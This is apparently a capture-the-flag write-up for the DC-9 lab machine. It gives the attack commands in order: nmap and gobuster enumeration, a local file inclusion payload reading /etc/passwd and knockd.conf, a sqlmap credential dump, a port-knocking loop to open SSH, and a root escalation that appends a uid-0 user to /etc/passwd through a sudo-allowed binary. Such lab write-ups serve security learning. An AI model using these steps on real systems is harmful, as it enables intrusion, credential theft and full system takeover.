# DC-9-Writeup
**Target IP:** 192.168.1.19  
**Difficulty:** Medium  
**Goal:** Capture the Root Flag

---

## 1. Enumeration
### Nmap Scan
First, I started with a full port scan:
`nmap -sV -sC -A -p- 192.168.1.19`
* **Port 80:** HTTP (Apache)
* **Port 22:** SSH (Filtered/Hidden)

### Web Discovery
Using `gobuster`, I found several interesting directories:
* `/manage.php`
* `/includes/`

---

## 2. Exploitation
### LFI (Local File Inclusion)
I discovered an LFI vulnerability in `manage.php` via the `file` parameter:
`http://192.168.1.19/manage.php?file=/etc/passwd`
This allowed me to see the system users (janitor, fredf, etc.).

### SQL Injection
The search page was vulnerable to SQL Injection (POST method). I used `sqlmap` to dump the database:
`sqlmap -r request.txt --dump`
* **Found:** Credentials for 'admin' and 17 other staff members.

---

## 3. Post-Exploitation & Port Knocking
Port 22 was filtered. By reading `/etc/knockd.conf` via LFI, I found the knock sequence: `7469, 8475, 9842`.
I used a bash one-liner to open SSH:
```bash
for x in 7469 8475 9842; do nmap -Pn -p $x 192.168.1.19; done
Then, I logged in as fredf via SSH.

4. Privilege Escalation (Root)
Checking sudo permissions: sudo -l

Allowed: /opt/devstuff/dist/test/test (as root, no password).

This binary allows appending data to files. I created a new root user in /etc/passwd:

Generated hash: openssl passwd -1 -salt hacker 123

Injected user: hacker:[HASH]:0:0:root:/root:/bin/bash

Executed: sudo /opt/devstuff/dist/test/test /tmp/user /etc/passwd

Finally, I switched to the new user: su hacker and captured the flag! 🚩
